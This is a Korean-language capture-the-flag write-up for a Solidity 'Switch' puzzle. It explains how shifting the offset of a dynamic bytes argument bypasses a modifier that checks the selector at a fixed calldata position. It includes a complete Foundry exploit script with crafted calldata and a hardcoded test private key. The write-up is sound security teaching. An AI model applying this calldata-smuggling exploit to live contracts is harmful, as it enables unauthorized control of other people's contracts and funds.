# 지문

그냥 스위치를 켜기만 하면 돼. 그렇게 어렵지 않겠지?

도움이 될 만한 것들:

* CALLDATA가 어떻게 인코딩되는지 이해하기


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
```

# 풀이 

`switchOn`을 `false`에서 `true`로 변경하는것이 목표임

활용할만한 주요 함수는 아래와 같음.

```solidity
function turnSwitchOn() public onlyThis {   // 스위치 켜기 (목표)
    switchOn = true;
}

function turnSwitchOff() public onlyThis {  // 스위치 끄기
    switchOn = false;
}

function flipSwitch(bytes memory _data) public onlyOff {  // 유일한 진입점
    (bool success,) = address(this).call(_data);
}

modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

```


이런것들을 고려해봤을 때 `flipSwitch`함수를 호출해서 `address(this).call(_data)`를 통해 `turnSwitchOn`함수를 호출해야된다는 결론이 나옴 

근데 문제는 `onlyOff` modifier. `onlyThis` modifier는 우회하기쉽다.


만약에 정상적으로 `flipSwitch(turnSwitchOn.selector)`를 호출하면 calldata layout은 아래와 같을 것임.
```
0x00-0x03: flipSwitch의 function selector (30c13ade)
0x04-0x23: _data의 offset (0x20 = 32)
0x24-0x43: _data의 길이 (0x04 = 4바이트)  
0x44-0x47: turnSwitchOn selector (76227e12) ← position 68에서 체크됨
```

그러나, _data는 bytes형이고 offset, length를 통해 동적으로 데이터를 올릴 수가 있음.
```
0x00-0x03: flipSwitch selector     
0x04-0x23: 0x60 (96 decimal)             
0x24-0x43: 더미 데이터 (32바이트)       
0x44-0x47: turnSwitchOff selector       
0x48-0x5f: 패딩 (24바이트)       
0x60-0x7f: 0x04                  
0x80-0x83: turnSwitchOn selector      
```

그래서 bytes type의 값을 검사하고싶을 때는 offset과 Length값을 체크해야됨. 고정되었다고 생각하면 안된다 

풀이 코드는 아래와 같음

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function flipSwitch(bytes memory _data) external;
    function switchOn() external view returns (bool);
}

contract SolveScript is Script {
    address public target = 0x6A358FD7B7700887b0cd974202CdF93208F793E2;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        
        console.log("Initial switch state:", ITarget(target).switchOn());

        bytes4 turnSwitchOnSelector = bytes4(keccak256("turnSwitchOn()"));
        bytes4 turnSwitchOffSelector = bytes4(keccak256("turnSwitchOff()"));
        bytes4 flipSwitchSelector = bytes4(keccak256("flipSwitch(bytes)"));
        
        console.log("turnSwitchOn selector:");
        console.logBytes4(turnSwitchOnSelector);
        console.log("turnSwitchOff selector:");
        console.logBytes4(turnSwitchOffSelector);
        
        // Craft malicious calldata:
        // Position 0x00-0x03: flipSwitch selector (automatic)
        // Position 0x04-0x23: offset to _data = 0x60 (96 decimal)
        // Position 0x24-0x43: dummy data (32 bytes)
        // Position 0x44-0x47: turnSwitchOff selector (position 68, checked by modifier)
        // Position 0x48-0x5f: padding (24 bytes)
        // Position 0x60-0x7f: length of actual _data = 0x04
        // Position 0x80-0x83: turnSwitchOn selector (actual call data)
        
        bytes memory maliciousCalldata = abi.encodePacked(
            flipSwitchSelector,                    // 0x00-0x03: function selector
            uint256(0x60),                        // 0x04-0x23: offset to _data (96)
            bytes32(0),                           // 0x24-0x43: dummy data
            turnSwitchOffSelector,                // 0x44-0x47: fake selector for modifier check
            bytes28(0),                           // 0x48-0x5f: padding to align
            uint256(0x04),                        // 0x60-0x7f: length of real _data
            turnSwitchOnSelector                  // 0x80-0x83: real function selector
        );
        
        console.log("Crafted calldata:");
        console.logBytes(maliciousCalldata);
        console.log("Calldata length:", maliciousCalldata.length);
        
        // Send the crafted calldata directly
        (bool success,) = target.call(maliciousCalldata);
        require(success, "Attack failed");
        
        console.log("Final switch state:", ITarget(target).switchOn());
        console.log("Attack completed successfully!");
        
        vm.stopBroadcast();
    }
}
```